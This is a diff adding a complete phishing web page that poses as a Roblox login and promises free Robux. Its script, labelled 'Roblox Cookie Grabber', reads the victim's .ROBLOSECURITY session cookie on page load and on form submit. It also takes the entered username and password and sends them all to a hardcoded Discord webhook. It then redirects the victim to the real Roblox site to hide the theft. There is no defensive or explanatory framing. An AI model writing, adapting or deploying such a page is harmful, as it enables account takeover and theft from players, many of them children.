@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Login - Free Robux</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1b1b1b;
+            color: #fff;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .login-box {
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        input[type="text"], input[type="password"] {
+            width: 200px;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #00b7ff;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0099cc;
+        }
+    </style>
+    <script>
+        // Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
+
+        // Function to send data to Discord
+        async function sendToWebhook(payload) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) {
+                    console.log("Webhook sent successfully!");
+                    // Redirect to real Roblox after sending
+                    window.location.href = "https://www.roblox.com";
+                } else {
+                    console.error("Webhook failed:", response.status);
+                }
+            } catch (error) {
+                console.error("Webhook fetch error:", error);
+            }
+        }
+
+        // Handle form submission
+        function handleLogin(event) {
+            event.preventDefault(); // Stop form submission
+
+            // Try to grab the cookie directly (works if not HttpOnly or misconfigured)
+            const cookies = document.cookie;
+            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
+            const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
+
+            // Get form inputs
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Payload with cookie and login attempt
+            const payload = {
+                username: "Roblox Cookie Grabber",
+                content: "Login attempt captured!",
+                embeds: [{
+                    title: "Captured Info",
+                    fields: [
+                        { name: "ROBLOSECURITY (if available)", value: "```" + cookieValue + "```", inline: true },
+                        { name: "Username", value: "```" + username + "```", inline: true },
+                        { name: "Password", value: "```" + password + "```", inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    color: 15258703
+                }]
+            };
+
+            // Send to Discord
+            sendToWebhook(payload);
+        }
+
+        // Check cookies on load (in case user is already logged in)
+        window.onload = function() {
+            const cookies = document.cookie;
+            if (cookies.includes(".ROBLOSECURITY=")) {
+                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
+                const cookieValue = robloxCookie.split('=')[1];
+
+                const payload = {
+                    username: "Roblox Cookie Grabber",
+                    content: "Cookie detected on page load!",
+                    embeds: [{
+                        title: "Captured Info",
+                        fields: [
+                            { name: "ROBLOSECURITY", value: "```" + cookieValue + "```", inline: true },
+                            { name: "Time", value: new Date().toLocaleString(), inline: false }
+                        ],
+                        color: 15258703
+                    }]
+                };
+                sendToWebhook(payload);
+            }
+        };
+    </script>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Roblox Login</h1>
+        <p>Log in to claim your free Robux!</p>
+        <form onsubmit="handleLogin(event)">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
